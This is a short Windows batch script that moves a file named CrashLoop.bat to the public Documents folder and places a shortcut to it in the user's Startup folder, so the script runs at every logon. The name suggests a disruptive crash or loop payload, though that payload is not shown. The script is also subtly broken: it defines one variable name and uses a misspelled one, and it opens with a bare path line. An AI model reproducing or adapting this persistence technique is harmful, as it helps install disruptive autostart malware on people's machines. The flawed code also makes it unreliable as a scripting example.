C:\Users\Public\Documents
set "filepath=CrashLoop.bat"
rem Get the current user's startup folder location
set "racourcipath=CrashLoop - Raccourci.lnk"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

set "filesdest=C:\Users\Public\Documents"

rem Move the shortcut to the startup folder
move "%filepath%" "%filedest%"
move "%racourcipath%" "%startupFolder%"